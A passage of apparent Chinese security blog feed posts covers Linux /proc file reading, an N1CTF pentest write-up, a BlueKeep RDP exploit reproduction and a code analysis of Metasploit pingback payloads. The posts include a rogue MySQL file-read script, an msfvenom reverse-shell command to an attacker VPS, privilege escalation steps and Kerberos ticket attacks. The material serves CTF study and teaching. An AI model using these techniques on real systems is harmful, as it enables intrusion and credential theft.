    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-9-11 0:44:23<br><img src="/wallpaper/thumb-1920-608362.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>我们经常在CTF比赛里，或者实际渗透里，使用到<code>/proc</code>这个目录，比如常常利用<code>/proc/self/cwd</code>来访问进程中的文件，使用<code>/proc/self/environ</code>读取系统的环境变量等</p><h2 id="0x01-Proc-到底是个什么东西"><a href="#0x01-Proc-到底是个什么东西" class="headerlink" title="0x01 Proc 到底是个什么东西"></a>0x01 Proc 到底是个什么东西</h2><p>实际上我们在任何的GUN/Linux操作系统里，都能找到这个目录，并且里面存在大量目录<br><img src="/浅谈 Linux系统 Proc.resources/70DE7AC6-D2C4-42A8-8A78-3F631B6515A6.png" alt="f48d8c5a7f26e7be272c7c36a0224e65"><br>但是如果，我们使用 <code>ls -al</code>来查看<br><img src="/浅谈 Linux系统 Proc.resources/F0A39E32-2167-47D3-B6B7-C76BD67C7F3D.png" alt="e39161263565785f4d27eea36ccec527"></p><p>可以看到绝大部分文件大小为0</p><p>但是我们可以使用cat命令获取其中的大量信息<br><img src="/浅谈 Linux系统 Proc.resources/C6AC528D-6694-4F8C-A7D8-DD139C74A308.png" alt="cc6935b581357039fa948356e6cc9ea9"></p><p>为什么0字节还能存有内容呢</p><p>这里提到一个概念：文件系统<br>维基百科-&gt;<a href="https://zh.wikipedia.org/zh-hans/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Procfs</a></p><p>而proc在Unix里常常被称为procfs -&gt; proc file system<br>它包含一个伪文件系统（启动时动态生成的文件系统），用于通过内核访问进程信息。这个文件系统通常被挂载到 /proc 目录。由于 /proc 不是一个真正的文件系统，它也就不占用存储空间，只是占用有限的内存。</p><p>维基百科-&gt;<a href="https://zh.wikipedia.org/wiki/Procfs" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Procfs</a></p><p>所以说，其实/proc目录更多的是起到一个类似于接口的作用，当我们使用cat命令获取时，它会从内存中获取信息，来返回给用户，而目录中的数字，其实就是PID号。</p><ul><li>/proc/$PID/cmdline  启动进程时执行的命令 </li><li>/proc/$PID/environ  该文件保存进程的环境变量 </li><li>/proc/$PID/cwd  一个符号连接, 指向进程当前的工作目录 </li><li>/proc/$PID/exe  一个符号连接, 指向被执行的二进制代码 </li><li>/proc/$PID/fd  进程所打开的每个文件都有一个符号连接在该子目录里, 以文件描述符命名, 这个名字实际上是指向真正的文件的符号连接 </li><li>/proc/$PID/attr  进程的属性 </li></ul><h2 id="0x02-proc-self"><a href="#0x02-proc-self" class="headerlink" title="0x02 /proc/self"></a>0x02 /proc/self</h2><p>相对于进程PID，我们在实战的文件读取中，更多使用的是<code>/proc/self</code>目录。<br>在<code>stackexchange</code>有一个讨论，<br><a href="https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for</a></p><p>也就是说，其实<code>/proc/self</code> 是指向当前进程的内存</p><p>比如之前护网杯2019的一道利用 MySQL LOAD DATA特性读取文件，让php远程连接到我们的客户端，然后发送命令，由于在远程服务器是使用apache进程来连接，所以我们可以读取到<code>/proc/self/cwd/index.php</code><br><img src="/浅谈 Linux系统 Proc.resources/0627C538-2DED-428D-9E06-F30859D58EE8.png" alt="c6ca5efffe4e45310d735cfbe4e70b8e"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/proc/self/cwd/index.php"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>tip: 当找不到网站路径的时候，可以利用<code>/proc/self/cwd</code>目录来读取apache进程的php文件源码</p><h2 id="0x03-相关链接🔗"><a href="#0x03-相关链接🔗" class="headerlink" title="0x03 相关链接🔗"></a>0x03 相关链接🔗</h2><p><a href="https://blog.csdn.net/goodluckwhh/article/details/17010029" target="_blank" rel="noopener">https://blog.csdn.net/goodluckwhh/article/details/17010029</a><br><a href="https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for</a><br><a href="https://www.cnblogs.com/youxin/p/4980058.html" target="_blank" rel="noopener">https://www.cnblogs.com/youxin/p/4980058.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-9-11 0:44:23&lt;br&gt;&lt;img src=&quot;/wallpaper/thumb-1920-608362.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="linux" scheme="http://patrilic.top/categories/linux/"/>
    
    
      <category term="proc" scheme="http://patrilic.top/tags/proc/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF Pentest N1ctf2019.lab Write-up</title>
    <link href="http://patrilic.top/2019/09/10/N1CTF%20%20Pentest%20N1ctf2019.lab%20Write-up/"/>
    <id>http://patrilic.top/2019/09/10/N1CTF  Pentest N1ctf2019.lab Write-up/</id>
    <published>2019-09-09T17:20:33.000Z</published>
    <updated>2019-09-09T15:03:25.597Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-10 01:20:33<br><img src="/wallpaper/thumb-1920-584470.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>scanf大师傅的题，tql..orz<br>被haya师傅带着做了老半天，才肝出来第一题，然后后面因为太多人搅屎没办法做了..</p><p>现在比赛结束了，趁着师傅还没关环境复盘一下</p><h2 id="0x01-Step-1"><a href="#0x01-Step-1" class="headerlink" title="0x01 Step 1"></a>0x01 Step 1</h2><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/8B6AEA77-BC71-4524-AB3E-03682BE9AA2B.png" alt="bfb092323f5fb9388df881f67790c5fa"></p><p>入口ip:<br>简单探测一下端口：47.52.129.242<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/F08CCB53-2BEA-45DC-B0DA-4F2BC882EB53.png" alt="dd0b6c61e3921224e34a939bed7af5db"></p><p>发现开了ProFTPD 1.3.5</p><p>稍微googole一下，发现存在任意文件拷贝漏洞（CVE-2019-12815）</p><p>使用ncftp 连接<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0E212818-FD0C-4FF0-A6FC-FB489AA4123A.png" alt="926bccdda31f92e2756d6d79922d0b74"></p><p>其实还是蛮卡的…<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/F29833FD-DAE3-44BF-B4D4-D52E08039466.png" alt="13ec778cbd22acd27d61aa2cddf1bf40"></p><p>然后我们把msg文件写入到patrilic.php里</p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/26BF5290-F82E-4BF0-83C7-4919069AB43D.png" alt="c33df3cd9728cf93922824154027574a"></p><blockquote><p>PS: 好像Windows连接需要密码，然后TOP1000字典就可以爆破出来，用户ftp 密码 mustang</p></blockquote><p>所以现在我们有一个<code>www-data</code>权限的webshell，先反弹一个shell到我们的vps上</p><p>先查看一下内核版本：<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/675A849D-69D2-4096-86FB-E966A8C08EB9.png" alt="82bb6955321a5530c3bf9a12277d6fb0"></p><p>ok，使用<code>msfvenom</code>生成一个x64的linux reverse_shell木马，放在web目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --payload  linux/x64/shell_reverse_tcp LHOST=45.xx.xx.xx LPORT=7778 -f elf -o /home/wwwroot/default/test.elf</span><br></pre></td></tr></table></figure><p>我们用file_put_contents + file_get_contents将文件下载到/tmp目录下<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/20EF13D9-B920-4C9F-84FE-FCD4AF273E9E.png" alt="d6ff181f69ac7604fe5c637ac30deb64"></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0EF41EEA-CA1B-43E0-871F-38F60DB606F6.png" alt="954843a51658096b9c4c38ff57e7b6fa"></p><p>然后给个执行权限 就可以弹回shell了</p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/123A148B-B113-4DD5-AFCB-75FA44314F4F.png" alt="bbf5cad7c673e608440379b7ff6ff091"></p><p>然后给它升级一下，搞成meterpreter session<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/E1D7AACB-FC79-43DA-8B32-CEB073860A57.png" alt="aa30ede9c3f038c1e9cd13dbca800839"></p><p>提权的话，因为给了提示嘛，snap，也能比较容易想到是年初那个漏洞</p><p>CVE-2019-7304<br>github上也有exp:<a href="https://github.com/initstring/dirty_sock" target="_blank" rel="noopener">https://github.com/initstring/dirty_sock</a></p><p>然后因为有师傅搅屎..就把snap升级了，导致没提示的时候，很多师傅一脸懵逼<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/8C6E7428-C46F-428F-86BA-21E122C7B106.png" alt="e1f33edcc2a556e7ed15a6c1bae0be25"></p><p>不过snap是在18.04的版本之后才会自带，所以在这嫌疑还是比较大的</p><p>我们先用python得到一个半互式shell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/19F30D2A-BF2B-4F89-91CB-9CB7DCE38BC9.png" alt="b95386722c3c3a34961c7b8528cc83c4"></p><p>可以看到其实，这个exp会生成一个<code>dirty_sock</code>用户，并且密码就是<code>dirty_sock</code><br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0F9D34D8-20D2-443B-B50D-33EC15E10CF4.png" alt="9f889bd4914086f7264e6899039dd6ec"></p><p>Get the flag: N1CTF{ImpOrtant_P0int3_4de0e}</p><h2 id="0x02-Step-2"><a href="#0x02-Step-2" class="headerlink" title="0x02 Step 2"></a>0x02 Step 2</h2><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/61C9F7F2-E91B-47E0-B3D4-B85F65BBEC53.png" alt="7a4b924e2833d1fcb3650d3014e8dcd4"></p><p>ps获取进程列表<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0B6BE438-DB34-4FA6-AFFC-3A0377150FB8.png" alt="131de33d1136f8bf8d9186506a6e97f0"></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/77BB4EC0-21B9-42AD-9EF3-38792F5D2DEC.png" alt="97c856f03e9a74098462c37adcfc9e6f"></p><p>可以看到dev上有一个域用户<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/2481FCC8-41D6-40BA-BC15-7E4AC208D4ED.png" alt="cd1e782d5470e4ef6206fffc7b86bbc6"></p><p>使用meterpreter加载一个powerview.ps1来帮助我们信息搜集</p><p>注意在现在的branch里是没有Get-DomainUser等函数的，使用<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906</a></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/545FAF70-7345-4667-8704-FB4244EBA3D2.png" alt="03048e40dac0352715cfbd422a7a75b6"></p><p>以下省略1000字(就是常规的Get-DomainUser等进行搜集)</p><p>通过信息搜集，我们获取到了存在一个backup Server<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/A6F837F7-5B9D-4222-8D72-6860DE27F023.png" alt="e7ef96141c9817a0d3369e74910e1a32"></p><p>调用<code>Invoke-Kerberoast</code>获取SPN密文<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/4A0FA7B5-A860-4CEA-BF81-7ED94637DF8B.png" alt="99c1cfebd9372ddf839cd407ca4099d9"><br>解密： P@ssword123</p><p>然后后面就是约束委派，提权拿到\backup.n1ctf2019.lab\backupfile\DCServer的访问权限</p><p>里面存有注册表备份，使用impacket套件解密后拿到本地管理员hash</p><p>然后银票据，金票据，拿到DC权限，最后拿到域管理员桌面上的flag</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>因为后面隧道实在是太不稳定了,session疯狂掉,一直在88这台机子上转悠<br>虽然好像就我一个人在弄<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/9359A854-337E-4AB2-BAE2-166F58C570AF.png" alt="91d5a2c55d9806198151c414dd240769"></p><p>vultr真惨啊..</p><p>然后后面的约束委派，实在是不怎么熟悉，还是经验太少..</p><p>最后实名膜一波<code>scanf</code>师傅，以及带我飞的<code>haya</code>师傅，orz</p><p>奉上官方wp：<br><a href="https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md" target="_blank" rel="noopener">https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md</a></p><p>Nu1L太强了， 也感谢一波scanf师傅带来这么有趣的题目（不过如果没人搅屎的话说不定能肝出来step2 hhhh）</p><p>最后还是觉得，过段时间好好研究一波kerberos～，趁着还在学校hhhh(kekeo都没用过的我 太菜了）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-10 01:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/thumb-1920-584470.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="n1ctf-pentest" scheme="http://patrilic.top/tags/n1ctf-pentest/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708 RDP 远程代码执行</title>
    <link href="http://patrilic.top/2019/09/09/CVE-2019-0708%20RDP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://patrilic.top/2019/09/09/CVE-2019-0708 RDP 远程代码执行/</id>
    <published>2019-09-09T09:03:55.000Z</published>
    <updated>2019-09-09T12:07:38.289Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-09 17:03:55<br><img src="/wallpaper/8.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>RDP服务的漏洞，除了之前的<code>ms12-020</code>(补丁号：<code>KB2621440</code>)，影响最轰动的也就是这次的<code>bluekeep</code>了，hw之前爆出的漏洞，前两天<code>rapid7</code>官方在github上传了最新的exp，可直接利用。</p><p><strong>影响范围</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows 7</span><br><span class="line"></span><br><span class="line">Windows Server 2008 R2</span><br><span class="line"></span><br><span class="line">Windows Server 2008</span><br><span class="line"></span><br><span class="line">Windows Server 2003</span><br><span class="line"></span><br><span class="line">Windows XP</span><br></pre></td></tr></table></figure></p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>目前需要替换exp包，我这里使用的是MacOS环境（exp包到处都有，就不放了)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cve_2019_0708_bluekeep_rce.rb 添加到 /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">rdp.rb 替换 /opt/metasploit-framework/embedded/framework/lib/msf/core</span><br><span class="line"></span><br><span class="line">rdp_scanner.rb 替换 /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/dp_scanner.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep.rb 替换 /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure></p><p>替换完成之后使用<code>reload_all</code>加载模块<br><img src="/CVE-2019-0708 RDP 远程代码执行.resources/6BC0D3A6-C794-4D55-A0DA-DD40C87198D4.png" alt="5bd7750bf0e644937edf8c6a1474e664"></p><p>可以看到存在4个targets，我使用的是VMWare，所以选target 3</p><p><strong>Windows 7 ultimate SP1</strong><br><img src="/CVE-2019-0708 RDP 远程代码执行.resources/FFEE06BD-258D-411F-AA56-C7D79F037E53.png" alt="e147fe734985ded3f8137442b883e5ec"></p><p>但是关掉session后重新打第二次，就蓝屏了<br><img src="/CVE-2019-0708 RDP 远程代码执行.resources/3DFEC667-3E43-47DD-B13E-C09010C459CA.png" alt="2342e02c78bd2677c4bbcc38523587d8"></p><p><strong>Windows Server 2008 R2</strong> ，果然蓝屏了2333<br><img src="/CVE-2019-0708 RDP 远程代码执行.resources/CCAF6F35-964F-47EB-B380-50B4BC89BD17.png" alt="a38d2f7b12e397248a5dfc1cdc8c9d37"></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>听大佬说，核心代码还没放出来，测试过程中发现除了08的不能成功，其他都还ok，（听说需要修改注册表）</p><h2 id="0x03-相关链接🔗"><a href="#0x03-相关链接🔗" class="headerlink" title="0x03 相关链接🔗"></a>0x03 相关链接🔗</h2><p><a href="https://www.freebuf.com/news/203584.html" target="_blank" rel="noopener">https://www.freebuf.com/news/203584.html</a><br><a href="https://www.freebuf.com/vuls/205380.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/205380.html</a><br><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020</a><br><a href="https://github.com/rapid7/metasploit-framework/pull/12283/files#diff-880ad99e50249db44c2f19b94f7a4870" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/12283/files#diff-880ad99e50249db44c2f19b94f7a4870</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-09 17:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/8.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="BlueKeep" scheme="http://patrilic.top/tags/BlueKeep/"/>
    
  </entry>
  
  <entry>
    <title>MSF Pingback Payloads</title>
    <link href="http://patrilic.top/2019/09/06/Payloads/"/>
    <id>http://patrilic.top/2019/09/06/Payloads/</id>
    <published>2019-09-05T16:47:46.000Z</published>
    <updated>2019-09-16T06:42:00.915Z</updated>
    
    <content type="html"><![CDATA[<p><a name="JSO7R"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><blockquote><p>文章首发于先知社区，文章链接：<a href="https://xz.aliyun.com/t/6268" target="_blank" rel="noopener">https://xz.aliyun.com/t/6268</a></p></blockquote><p>今天早上Rapid7cn的公众号更新了一篇文章，然后就被群里的大师傅们转发了好几遍233，感觉挺有意思的，也想着分析一下</p><p><a href="https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA</a></p><p>官网： <a href="https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/" target="_blank" rel="noopener">https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/</a><br><a name="mXsId"></a></p><h2 id="0x01-pingback"><a href="#0x01-pingback" class="headerlink" title="0x01 pingback"></a>0x01 pingback</h2><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567694251815-6a249db8-4ac8-4a27-b999-49869d8138d5.png" alt="image.png">这次一共更新了10个pingback payload, 至于什么是pingback，其实msf官方在github已经说的很清楚了<br><a href="https://github.com/rapid7/metasploit-framework/pull/12129" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/12129</a></p><blockquote><p>Pingback payloads are designed to provide a limited-functionality payload to verify an exploit has worked. <strong>It does not provide a shell of any kind.</strong> A pingback payload creates a “random” UUID value (separate from the payload UUID) that is written to the Metasploit database along with other data. When executed on target, the payload sends back that UUID to verify that the exploit worked, but nothing else. When Framework receives that UUID, we verify the target is vulnerable to the exploit without loading an interactive shell.<br>This prevents traditional [W/M]ITM attacks or someone sniffing the traffic for information, as the UUID itself means nothing to a listener, and without further execution, the session itself is not particularly valuable to an attacker.</p></blockquote><p>简单来说感觉其实就是，AV对msf之前的常规reverse_shell会进行拦截，导致我们并不能很清楚的知道目标是否存在该漏洞，然后这个payload就完全不会产生交互式shell，而只是返回一个UUID，能让我们知道poc/exp是否执行成功，然后目标是否存在当前漏洞，而不必担心被中间人攻击或者被拦截</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567696662682-c96fa1cc-966d-4b06-b19e-2d52f8884ed3.png" alt="image.png"></p><h2 id="0x02-How-to-Use"><a href="#0x02-How-to-Use" class="headerlink" title="0x02 How to Use"></a>0x02 How to Use</h2><p>翻看代码，我们发现它其实是每次生成一个新的UUID，然后将其发送到目标中，然后调用listener中的payload设置一个监听，然后当程序进行 <code>Pingback</code> 时，MSF打开一个会话来接受UUID，最后拿到完整UUID后，就关闭当前session</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msf/modules/payloads/singles/ruby/pingback_reverse_tcp.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruby_string</span></span></span><br><span class="line">    <span class="keyword">self</span>.pingback_uuid <span class="params">||</span>= <span class="keyword">self</span>.generate_pingback_uuid</span><br><span class="line">    lhost = datastore[<span class="string">'LHOST'</span>]</span><br><span class="line">    lhost = <span class="string">"[<span class="subst">#&#123;lhost&#125;</span>]"</span> <span class="keyword">if</span> Rex::Socket.is_ipv6?(lhost)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"require'socket';"</span> \</span><br><span class="line">      <span class="string">"c=TCPSocket.new'<span class="subst">#&#123;lhost&#125;</span>',<span class="subst">#&#123;datastore[<span class="string">'LPORT'</span>].to_i&#125;</span>;"</span> \</span><br><span class="line">      <span class="string">"c.puts'<span class="subst">#&#123;[[<span class="keyword">self</span>.pingback_uuid].pack(<span class="string">'H*'</span>)].pack(<span class="string">'m0'</span>)&#125;</span>'.unpack('m0');"</span></span><br><span class="line">      <span class="string">"c.close"</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msf/base/sessions/pingback.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uuid_read</span></span></span><br><span class="line">    uuid_raw = rstream.get_once(<span class="number">16</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">unless</span> uuid_raw</span><br><span class="line">    <span class="keyword">self</span>.uuid_string = uuid_raw.each_byte.map &#123; <span class="params">|b|</span> <span class="string">"%02x"</span> % b.to_i() &#125;.join</span><br><span class="line">    print_status(<span class="string">"Incoming UUID = <span class="subst">#&#123;uuid_string&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">if</span> framework.db.active</span><br><span class="line">      <span class="keyword">begin</span></span><br><span class="line">        payload = framework.db.payloads(<span class="symbol">uuid:</span> uuid_string).first</span><br><span class="line">        <span class="keyword">if</span> payload.<span class="literal">nil</span>?</span><br><span class="line">          print_warning(<span class="string">"Provided UUID (<span class="subst">#&#123;uuid_string&#125;</span>) was not found in database!"</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          print_good(<span class="string">"UUID identified (<span class="subst">#&#123;uuid_string&#125;</span>)"</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">rescue</span> ActiveRecord::ConnectionNotEstablished</span><br><span class="line">        print_status(<span class="string">"WARNING: UUID verification and logging is not available, because the database is not active."</span>)</span><br><span class="line">      <span class="keyword">rescue</span> =&gt; e</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Can we have a more specific exception handler?</span></span><br><span class="line">        <span class="comment"># Test: what if we send no bytes back?  What if we send less than 16 bytes?  Or more than?</span></span><br><span class="line">        elog(<span class="string">"Can't get original UUID"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Class: <span class="subst">#&#123;e.<span class="keyword">class</span>.name&#125;</span>"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Message: <span class="subst">#&#123;e.message&#125;</span>"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Backtrace: <span class="subst">#&#123;e.backtrace&#125;</span>"</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_warning(<span class="string">"WARNING: UUID verification and logging is not available, because the database is not active."</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>然后在 <code>option.rb</code> 中，我们能看到pingback的模块存在两个选项：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info = &#123;&#125;)</span></span></span><br><span class="line">    <span class="keyword">super</span></span><br><span class="line">    register_advanced_options(</span><br><span class="line">      [</span><br><span class="line">        Msf::OptInt.new(<span class="string">'PingbackRetries'</span>, [<span 